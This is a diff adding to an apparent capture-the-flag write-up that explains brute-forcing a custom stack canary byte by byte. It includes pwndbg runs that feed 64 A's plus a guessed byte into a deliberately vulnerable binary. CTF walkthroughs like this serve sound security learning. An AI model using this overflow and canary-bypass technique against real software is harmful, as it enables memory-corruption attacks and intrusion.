@@ -397,3 +397,28 @@ Please create 'canary.txt' in this directory with your own debugging canary.
 [~/Desktop] 
 $ echo "TEST" > canary.txt
 ```
+
+memcmp() is being used to check if the current canary is the same as the global canary, but since we choose the buffer size, we can brute 1 byte at a time:
+
+```
+pwndbg> run
+Starting program: /home/connor/Desktop/vuln 
+Downloading separate debug info for system-supplied DSO at 0xf7fc7000                                      
+[Thread debugging using libthread_db enabled]                                                              
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+How Many Bytes will You Write Into the Buffer?
+> 65                                                               
+Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT
+Ok... Now Where's the Flag?
+[Inferior 1 (process 106998) exited normally]
+pwndbg> 
+pwndbg> run
+Starting program: /home/connor/Desktop/vuln 
+[Thread debugging using libthread_db enabled]                                                              
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+How Many Bytes will You Write Into the Buffer?
+> 65
+Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX
+***** Stack Smashing Detected ***** : Canary Value Corrupt!
+[Inferior 1 (process 107001) exited normally]
+```
